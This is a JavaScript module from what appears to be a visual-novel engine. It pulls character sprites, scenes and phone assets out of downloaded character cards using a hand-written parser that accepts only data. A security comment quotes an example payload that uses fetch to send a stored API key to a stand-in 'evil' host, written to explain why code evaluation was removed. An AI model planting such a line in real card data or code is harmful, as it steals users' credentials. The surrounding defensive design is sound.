/* ============================================================
 * core/cardres.js —— 载入角色卡时，**从卡里直接读出素材表**
 *
 * 为什么有这个文件
 * ----------------
 * 以前立绘表/场景表/手机资源是靠 tools/build-juus.py 这个 Python 脚本
 * **离线**从卡里抽出来，生成 resource/juus/*.js，再由 index.html 静态加载。
 * 于是出现一个很别扭的局面：用户在开场引导里把角色卡载进去了，
 * 引擎却只从卡里读了世界书和正则，立绘一张都没读 —— 因为那一步压根不存在。
 * 没有预生成文件的话（比如刚从 git 克隆下来），舞台就是空的。
 *
 * 数据本来就在卡里，没有任何理由非要先跑一遍 Python。这个模块把那套抽取逻辑
 * 搬到运行时，载卡时跑一遍，几十毫秒的事。
 *
 * resource/juus/*.js 现在是**纯可选的加速项**：有就先装上，
 * 载卡后卡里抽出来的会覆盖同名条目（以卡为准，它才是真源）。
 *
 * 数据在卡里的什么位置
 * --------------------
 *   立绘 / 场景   data.extensions.regex_scripts[] 里 scriptName 含「gal MVU」那条，
 *                 它的 replaceString 是一段 JS 源码，里面有：
 *                   var EXPRESSION_MAP = { 角色: { 服装: { 表情: url|[url...] } } }
 *                   var SCENE_MAP      = { "地点(时段)": url }
 *                   var DEFAULT_SPRITES= { 角色: url|[url...] }
 *   手机资源      data.extensions.tavern_helper.scripts[] 里 name 为「juus小手机」那条，
 *                 content 里有 AVATARS / STICKERS / DEFAULT_AVATARS /
 *                 GROUP_META / FACTION_MEMBERS / BASE_POSTS / BASE_TRENDS / BASE_AREA
 *
 * 这些是 juus 卡的约定。**按名字找不到就按内容找**（见 findSource），
 * 所以改过脚本名的分叉卡也能认；完全没有这些变量的卡就返回 0，不报错。
 *
 * ⚠ 安全：解析角色卡**绝不执行卡里的代码**
 * ------------------------------------------
 * 抽出来的是一段对象字面量。解析只有两级：
 *   1) JSON.parse —— 严格 JSON，绝大多数走这条
 *   2) LiteralParser —— 自己写的、**只认数据**的解析器（见下面那一大段注释）
 * 解析不了就返回 null，宁可少抽几个条目。
 *
 * 曾经有过第 3 级 new Function 求值，理由是「引擎本来就跑卡自带的正则，
 * 信任级别一样」。那个理由是错的，已经删掉 —— 详见 LiteralParser 上方的注释。
 * ============================================================ */
(function (global) {
  'use strict';

  /* 「游乐场(朝)」拆成 地点=游乐场 / 时段=朝；
     括号里不是时段词的（「卧室(床上)」）并进地点名。与 build-juus.py 保持一致。 */
  var PERIODS = {
    '朝': 1, '午': 1, '夜': 1, '清晨': 1, '早': 1, '晚': 1,
    '黄昏': 1, '白日': 1, '夜晚': 1, '日': 1, '傍晚': 1
  };
  var DEFAULT_PERIOD = '白日';

  /* ---------- 从一段 JS 源码里抠出 `var NAME = <字面量>` ---------- */

  /**
   * 括号配平地截出字面量。跳过字符串和注释里的括号 ——
   * 不跳的话，URL 里一个 `}` 就能把截取位置带歪。
   * @returns {string|null} 含首尾括号的源码片段
   */
  function literalAfter(src, name) {
    var re = new RegExp('(?:^|[^\\w$])(?:var|let|const)\\s+' +
                        name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\s*=');
    var m = re.exec(src);
    if (!m) return null;
    var i = src.indexOf('=', m.index) + 1;

    var depth = 0, start = -1;
    var inStr = null, esc = false;
    for (var k = i; k < src.length; k++) {
      var c = src.charAt(k);

      if (inStr) {
        if (esc) { esc = false; continue; }
        if (c === '\\') { esc = true; continue; }
        if (c === inStr) inStr = null;
        continue;
      }
      if (c === '"' || c === "'" || c === '`') { inStr = c; continue; }
      if (c === '/' && src.charAt(k + 1) === '/') {
        k = src.indexOf('\n', k); if (k < 0) break; continue;
      }
      if (c === '/' && src.charAt(k + 1) === '*') {
        k = src.indexOf('*/', k); if (k < 0) break; k++; continue;
      }
      if (c === '{' || c === '[') {
        if (depth === 0) start = k;
        depth++;
      } else if (c === '}' || c === ']') {
        depth--;
        if (depth === 0 && start >= 0) return src.slice(start, k + 1);
        if (depth < 0) return null;
      }
    }
    return null;
  }

  /* ============================================================
   * 受控字面量解析器
   *
   * ⚠ 这里**绝对不能**用 new Function / eval。
   *
   * 早先这里有个「JSON.parse → 放宽后再 parse → new Function 求值」的三级降级，
   * 理由是「引擎本来就跑卡自带的正则，信任级别一样」。**那个理由是错的**：
   * 正则只做字符串替换，从不执行代码。而角色卡是从网上下载、互相传的文件。
   * 实测那条路径能让卡里的任意 JS 跑起来：
   *
   *   var EXPRESSION_MAP = { "柴郡": (fetch('https://evil/?k='
   *                         + localStorage.getItem('gal_api_config')), {...}) };
   *
   * 立绘照常抽出来、界面毫无异样，同时 API 密钥被送走。还能用死循环把页面卡死
   * （try/catch 拦不住）。所以改成下面这个自己写的解析器：
   * 它**只认数据**，见到函数调用、运算符、任何非字面量的东西一律放弃返回 null。
   *
   * 唯一放行的非纯字面量形式是「引用另一个已解析的变量」：
   *   GROUP_META = { '重樱群': { members: FACTION_MEMBERS['重樱'] } }
   * 卡里真的这么写，而它只是取值，不产生副作用。
   * ============================================================ */

  function LiteralParser(src, deps) {
    this.s = String(src == null ? '' : src);
    this.i = 0;
    this.deps = deps || {};
  }
  LiteralParser.prototype = {
    error: function () { throw new SyntaxError('不是纯字面量'); },
    ws: function () {
      for (;;) {
        var c = this.s.charAt(this.i);
        if (c === ' ' || c === '\t' || c === '\n' || c === '\r' || c === '\f' || c === '\v') {
          this.i++; continue;
        }
        if (c === '/' && this.s.charAt(this.i + 1) === '/') {
          var nl = this.s.indexOf('\n', this.i);
          this.i = nl < 0 ? this.s.length : nl + 1; continue;
        }
        if (c === '/' && this.s.charAt(this.i + 1) === '*') {
          var cl = this.s.indexOf('*/', this.i);
          if (cl < 0) this.error();
          this.i = cl + 2; continue;
        }
        return;
      }
    },
    eat: function (ch) {
      this.ws();
      if (this.s.charAt(this.i) !== ch) this.error();
      this.i++;
    },
    /** 顶层：解析一个值，然后必须刚好到头 */
    parse: function () {
      var v = this.value();
      this.ws();
      if (this.i !== this.s.length) this.error();
      return v;
    },
    value: function () {
      this.ws();
      var c = this.s.charAt(this.i);
      if (c === '{') return this.object();
      if (c === '[') return this.array();
      if (c === '"' || c === "'" || c === '`') return this.string();
      if (c === '-' || c === '+' || (c >= '0' && c <= '9') || c === '.') return this.number();
      if (/[A-Za-z_$\u00A0-\uFFFF]/.test(c)) return this.word();
      this.error();
    },
    object: function () {
      this.eat('{');
      var o = {};
      this.ws();
      if (this.s.charAt(this.i) === '}') { this.i++; return o; }
      for (;;) {
        this.ws();
        var k;
        var c = this.s.charAt(this.i);
        if (c === '"' || c === "'" || c === '`') k = this.string();
        else if (/[A-Za-z_$0-9\u00A0-\uFFFF]/.test(c)) k = this.bareKey();
        else this.error();
        this.eat(':');
        o[k] = this.value();
        this.ws();
        c = this.s.charAt(this.i);
        if (c === ',') { this.i++; this.ws();
          if (this.s.charAt(this.i) === '}') { this.i++; return o; }   /* 尾逗号 */
          continue; }
        if (c === '}') { this.i++; return o; }
        this.error();
      }
    },
    array: function () {
      this.eat('[');
      var a = [];
      this.ws();
      if (this.s.charAt(this.i) === ']') { this.i++; return a; }
      for (;;) {
        a.push(this.value());
        this.ws();
        var c = this.s.charAt(this.i);
        if (c === ',') { this.i++; this.ws();
          if (this.s.charAt(this.i) === ']') { this.i++; return a; }   /* 尾逗号 */
          continue; }
        if (c === ']') { this.i++; return a; }
        this.error();
      }
    },
    /* 裸键要认中文：卡里 `{ 重樱: [...] }` 和 `FACTION_MEMBERS.重樱` 都是合法 JS。
       \u00A0-\uFFFF 一刀切地放行非 ASCII，够用且不会误吞标点（标点在前面就被分支走了）。 */
    bareKey: function () {
      var m = /^[A-Za-z_$\u00A0-\uFFFF][\w$\u00A0-\uFFFF]*|^\d+/.exec(this.s.slice(this.i));
      if (!m) this.error();
      this.i += m[0].length;
      return m[0];
    },
    string: function () {
      var q = this.s.charAt(this.i++);
      var out = '';
      for (;;) {
        if (this.i >= this.s.length) this.error();
        var c = this.s.charAt(this.i++);
        if (c === q) return out;
        if (c !== '\\') { out += c; continue; }
        var e = this.s.charAt(this.i++);
        if (e === 'n') out += '\n';
        else if (e === 't') out += '\t';
        else if (e === 'r') out += '\r';
        else if (e === 'b') out += '\b';
        else if (e === 'f') out += '\f';
        else if (e === 'v') out += '\v';
        else if (e === '0') out += '\0';
        else if (e === 'u') {
          var hex = this.s.substr(this.i, 4);
          if (!/^[0-9a-fA-F]{4}$/.test(hex)) this.error();
          out += String.fromCharCode(parseInt(hex, 16));
          this.i += 4;
        } else if (e === 'x') {
          var h2 = this.s.substr(this.i, 2);
          if (!/^[0-9a-fA-F]{2}$/.test(h2)) this.error();
          out += String.fromCharCode(parseInt(h2, 16));
          this.i += 2;
        } else if (e === '\n') { /* 续行，什么都不加 */ }
        else out += e;
      }
    },
    number: function () {
      var m = /^[+-]?(?:0[xX][0-9a-fA-F]+|(?:\d+\.?\d*|\.\d+)(?:[eE][+-]?\d+)?)/
                .exec(this.s.slice(this.i));
      if (!m) this.error();
      this.i += m[0].length;
      return Number(m[0]);
    },
    /** true / false / null / undefined / NaN，以及「引用另一个已解析的变量」 */
    word: function () {
      var m = /^[A-Za-z_$\u00A0-\uFFFF][\w$\u00A0-\uFFFF]*/.exec(this.s.slice(this.i));
      if (!m) this.error();
      var w = m[0];
      this.i += w.length;
      if (w === 'true') return true;
      if (w === 'false') return false;
      if (w === 'null') return null;
      if (w === 'undefined') return undefined;
      if (w === 'NaN') return NaN;
      if (!this.deps.hasOwnProperty(w)) this.error();   // 认不出的标识符：放弃
      /* 只允许在已解析的依赖上做取值：FACTION_MEMBERS['重樱'] / FOO.bar[0] */
      var cur = this.deps[w];
      for (;;) {
        this.ws();
        var c = this.s.charAt(this.i);
        if (c === '.') {
          this.i++;
          var k = this.bareKey();
          cur = (cur == null) ? undefined : cur[k];
          continue;
        }
        if (c === '[') {
          this.i++;
          var idx = this.value();
          this.eat(']');
          cur = (cur == null) ? undefined : cur[idx];
          continue;
        }
        /* 函数调用一律拒绝 —— 这是安全边界，别放宽 */
        if (c === '(') this.error();
        return cur;
      }
    }
  };

  /**
   * 解析一个字面量。两级：先 JSON.parse（最快，覆盖绝大多数），
   * 再用上面那个只认数据的解析器（处理注释、裸键、单引号、尾逗号、变量引用）。
   * **没有第三级。** 解析不了就返回 null，宁可少抽几个条目，也不执行卡里的代码。
   *
   * @param {Object} [deps] 名 → **已解析好的值**（注意不是源码片段了）
   */
  function parseLiteral(src, deps) {
    if (src == null) return null;
    try { return JSON.parse(src); } catch (e) { /* 下一级 */ }
    try { return new LiteralParser(src, deps).parse(); } catch (e2) { return null; }
  }

  /* ---------- 在卡里定位那两段脚本 ---------- */

  function cardData(card) { return (card && (card.data || card)) || {}; }

  /**
   * 先按名字找，找不到就按内容找 —— 分叉卡常把脚本改名，
   * 但变量名是代码里到处引用的，不会随便改。
   */
  function findSource(list, getName, getBody, nameHint, probe) {
    var arr = Array.isArray(list) ? list : [];
    var i, body;
    for (i = 0; i < arr.length; i++) {
      if (String(getName(arr[i]) || '').indexOf(nameHint) >= 0) {
        body = String(getBody(arr[i]) || '');
        if (probe.test(body)) return body;
      }
    }
    for (i = 0; i < arr.length; i++) {
      body = String(getBody(arr[i]) || '');
      if (probe.test(body)) return body;
    }
    return '';
  }

  function galSource(card) {
    var d = cardData(card);
    return findSource((d.extensions && d.extensions.regex_scripts) || [],
      function (r) { return r.scriptName; },
      function (r) { return r.replaceString; },
      'gal MVU', /(?:var|let|const)\s+(?:EXPRESSION_MAP|DEFAULT_SPRITES|SCENE_MAP)\s*=/);
  }

  function phoneSource(card) {
    var d = cardData(card);
    var th = (d.extensions && d.extensions.tavern_helper) || {};
    return findSource(th.scripts || [],
      function (s) { return s.name; },
      function (s) { return s.content; },
      '小手机', /(?:var|let|const)\s+(?:AVATARS|STICKERS|DEFAULT_AVATARS)\s*=/);
  }

  /* ---------- 归一化 ---------- */

  function asList(v) {
    if (v == null) return [];
    if (Array.isArray(v)) return v.filter(function (x) { return !!x; });
    return [v];
  }

  /** EXPRESSION_MAP → { 角色: { default_outfit, outfits: { 服装: { 表情: [url] } } } } */
  function normChars(expr) {
    var out = {};
    if (!expr || typeof expr !== 'object') return out;
    Object.keys(expr).forEach(function (name) {
      var outfits = expr[name];
      if (!outfits || typeof outfits !== 'object') return;
      var norm = {}, first = null;
      Object.keys(outfits).forEach(function (o) {
        var table = outfits[o];
        if (!table || typeof table !== 'object') return;
        var e2 = {}, any = false;
        Object.keys(table).forEach(function (ex) {
          var urls = asList(table[ex]);
          if (urls.length) { e2[ex] = urls; any = true; }
        });
        if (any) { norm[o] = e2; if (first == null) first = o; }
      });
      if (first != null) out[name] = { default_outfit: first, outfits: norm };
    });
    return out;
  }

  /** SCENE_MAP「地点(时段)」→ { 地点: { 时段: url } } */
  function normScenes(sceneMap) {
    var out = {};
    if (!sceneMap || typeof sceneMap !== 'object') return out;
    Object.keys(sceneMap).forEach(function (key) {
      var url = sceneMap[key];
      if (!url) return;
      var k = String(key).trim();
      var m = /^(.*?)[（(]([^（()）]*)[)）]$/.exec(k);
      var loc = k, period = DEFAULT_PERIOD;
      if (m && PERIODS[m[2]]) { loc = m[1].trim(); period = m[2]; }
      if (!loc) return;
      if (!out[loc]) out[loc] = {};
      out[loc][period] = url;
    });
    return out;
  }

  function normDefaults(defs) {
    var out = {};
    if (!defs || typeof defs !== 'object') return out;
    Object.keys(defs).forEach(function (name) {
      var urls = asList(defs[name]);
      if (urls.length) out[name] = urls;
    });
    return out;
  }

  /* ---------- 对外 ---------- */

  /**
   * 只抽取，不改全局。想先看看卡里有什么就用它。
   * @returns {{resource:{characters,scenes,defaults}, phone:Object, stats:Object}}
   */
  function extract(card) {
    var gal = galSource(card);
    var chars = normChars(parseLiteral(literalAfter(gal, 'EXPRESSION_MAP')));
    var scenes = normScenes(parseLiteral(literalAfter(gal, 'SCENE_MAP')));
    var defs = normDefaults(parseLiteral(literalAfter(gal, 'DEFAULT_SPRITES')));

    var ph = phoneSource(card);
    var phone = {};
    if (ph) {
      /* GROUP_META 会引用 FACTION_MEMBERS。先把它解析成**值**，
         再作为 deps 传下去 —— LiteralParser 只在这些已知值上做取值，
         不会执行任何东西。 */
      var deps = { FACTION_MEMBERS: parseLiteral(literalAfter(ph, 'FACTION_MEMBERS')) };
      [['avatars', 'AVATARS'], ['stickers', 'STICKERS'],
       ['defaultAvatars', 'DEFAULT_AVATARS'], ['groupMeta', 'GROUP_META'],
       ['basePosts', 'BASE_POSTS'], ['baseTrends', 'BASE_TRENDS'],
       ['baseArea', 'BASE_AREA']].forEach(function (pair) {
        var v = parseLiteral(literalAfter(ph, pair[1]), deps);
        if (v != null) phone[pair[0]] = v;
      });
    }

    function count(o) { return o ? Object.keys(o).length : 0; }
    function sprites(o) {
      var n = 0;
      Object.keys(o || {}).forEach(function (k) {
        var ofs = o[k].outfits || {};
        Object.keys(ofs).forEach(function (f) {
          Object.keys(ofs[f]).forEach(function (e) { n += ofs[f][e].length; });
        });
      });
      return n;
    }
    function flat(o) {
      var n = 0;
      Object.keys(o || {}).forEach(function (k) { n += o[k].length; });
      return n;
    }
    function scn(o) {
      var n = 0;
      Object.keys(o || {}).forEach(function (k) { n += Object.keys(o[k]).length; });
      return n;
    }

    return {
      resource: { characters: chars, scenes: scenes, defaults: defs },
      phone: phone,
      stats: {
        found: !!(gal || ph),
        chars: count(chars), sprites: sprites(chars),
        defaultChars: count(defs), defaultSprites: flat(defs),
        locations: count(scenes), scenes: scn(scenes),
        avatars: count(phone.avatars), stickers: count(phone.stickers),
        groups: count(phone.groupMeta),
        posts: (phone.basePosts || []).length, trends: (phone.baseTrends || []).length
      }
    };
  }

  /**
   * 抽取并**就地合并**进 window.RESOURCE / window.PHONE_RES。
   *
   * 必须就地合并，不能整个替换 —— core/resolver.js 在加载时就抓住了
   * window.RESOURCE 的引用（`var R = global.RESOURCE = ...`），
   * 换掉对象它就看不见新数据了。
   *
   * 卡里的覆盖预生成文件里的同名条目：卡才是真源。
   */
  function apply(card) {
    var got = extract(card);

    var R = global.RESOURCE = global.RESOURCE ||
      { characters: {}, scenes: {}, defaults: {} };
    R.characters = R.characters || {};
    R.scenes = R.scenes || {};
    R.defaults = R.defaults || {};

    Object.assign(R.characters, got.resource.characters);
    Object.assign(R.defaults, got.resource.defaults);
    /* 场景要按地点合并，不能整个覆盖 —— 否则卡里有「食堂(朝)」
       就会把预生成文件里的「食堂(夜)」一起顶掉。 */
    Object.keys(got.resource.scenes).forEach(function (loc) {
      R.scenes[loc] = Object.assign({}, R.scenes[loc], got.resource.scenes[loc]);
    });

    var P = global.PHONE_RES = global.PHONE_RES || {};
    Object.keys(got.phone).forEach(function (k) {
      var v = got.phone[k];
      if (Array.isArray(v)) P[k] = v;
      else if (v && typeof v === 'object') P[k] = Object.assign({}, P[k], v);
      else P[k] = v;
    });

    return got.stats;
  }

  global.CardRes = {
    extract: extract, apply: apply,
    /* 下面这些导出只为单测，正常用不到 */
    _literalAfter: literalAfter, _parseLiteral: parseLiteral,
    _normChars: normChars, _normScenes: normScenes, _normDefaults: normDefaults
  };
})(typeof window !== 'undefined' ? window : globalThis);
